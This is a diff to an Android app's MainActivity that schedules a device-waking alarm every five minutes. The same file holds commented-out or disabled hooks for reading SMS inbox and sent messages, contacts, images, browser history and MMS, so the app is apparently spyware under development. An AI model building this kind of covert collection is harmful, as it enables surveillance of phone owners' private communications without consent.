@@ -12,6 +12,7 @@ import android.content.pm.PackageManager;
 import android.media.Ringtone;
 import android.media.RingtoneManager;
 import android.net.Uri;
+import android.os.Build;
 import android.os.Environment;
 import android.support.v4.content.AsyncTaskLoader;
 import android.support.v7.app.AppCompatActivity;
@@ -40,6 +41,7 @@ import java.util.Calendar;
 
 public class MainActivity extends AppCompatActivity {
     private static String Msg = "MyMsg1";
+    final int SDK_INT = Build.VERSION.SDK_INT;
 
 
     private static final int REQUEST_CODE = 0;
@@ -54,8 +56,16 @@ public class MainActivity extends AppCompatActivity {
         AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
         Intent myIntent = new Intent(MainActivity.this, AlarmReceiver.class);
         PendingIntent pendingIntent = PendingIntent.getBroadcast(MainActivity.this, 0, myIntent, 0);
-        alarmManager.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()+ 1000*60*5, pendingIntent);
-       // TelephonyManager t = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+        if (SDK_INT < Build.VERSION_CODES.KITKAT) {
+            alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()+1000*60*5, pendingIntent);
+        }
+        else if (Build.VERSION_CODES.KITKAT <= SDK_INT  && SDK_INT < Build.VERSION_CODES.M) {
+            alarmManager.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()+1000*60*5, pendingIntent);
+        }
+        else if (SDK_INT >= Build.VERSION_CODES.M) {
+            alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()+1000*60*5, pendingIntent);
+        }
+
 
 
 
@@ -71,7 +81,7 @@ public class MainActivity extends AppCompatActivity {
         //CONTACTS
 //        getContacts();//in test
         //SMS
-        ReadSms ob = new ReadSms(getContentResolver());
+//        ReadSms ob = new ReadSms(getContentResolver());
         String uri_send_sms = "content://sms/sent";
         String uri_inbox_sms = "content://sms/inbox";
 //        ob.massAllSMS(uri_send_sms, uri_inbox_sms); // SMS'ki
@@ -90,7 +100,7 @@ public class MainActivity extends AppCompatActivity {
 //        img.getAllImages();
 
         //BROWSER
-        BrowserHistory br_h = new BrowserHistory(getContentResolver());
+//        BrowserHistory br_h = new BrowserHistory(getContentResolver());
 //        br_h.getBrowserHist();
 
         //MMS
